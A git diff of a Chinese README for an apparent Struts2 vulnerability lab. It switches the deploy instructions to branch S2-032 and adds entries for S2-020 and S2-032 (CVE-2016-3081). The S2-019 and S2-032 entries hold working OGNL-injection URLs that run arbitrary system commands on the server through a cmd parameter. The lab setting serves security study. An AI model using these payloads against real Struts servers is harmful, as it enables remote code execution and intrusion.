@@ -10,14 +10,14 @@ git branch -a
 
 3.切换到分支
 git checkout 分支名
-如git checkout S2-019
+如git checkout S2-032
 
 4.打包
 mvn clean package
 
 5.部署在Tomcat中
-将\target中生成的Struts2-019.war复制到Tomcat下的webapps目录中，然后开启Tomcat
-访问http://127.0.0.1:8080/Struts2-019/index.action
+将\target中生成的Struts2-032.war复制到Tomcat下的webapps目录中，然后开启Tomcat
+访问http://127.0.0.1:8080/Struts2-032/index.action
 
 # 相关信息
 
@@ -76,4 +76,26 @@ CVE-2013-4316
 POC:
 http://127.0.0.1:8080/Struts2-019/index.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),%23b=%23a.getInputStream(),%23c=new java.io.InputStreamReader(%23b),%23d=new java.io.BufferedReader(%23c),%23e=new char[1000],%23d.read(%23e),%23resp.println(%23e),%23resp.close()
 
+
+6.S2-020
+
+CVE-2014-0094
+
+影响版本：Struts 2.0.0 – Struts 2.3.16
+
+官方公告：http://struts.apache.org/docs/s2-020.html
+
+POC:暂无
+
+
+7.S2-032
+
+CVE-2016-3081
+
+影响版本：Struts 2.3.18 – Struts 2.3.28 
+
+官方公告：http://struts.apache.org/docs/s2-032.html
+
+POC:
+http://127.0.0.1:8080/Struts2-032/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=\\A&ppp=%20&encoding=UTF-8
 
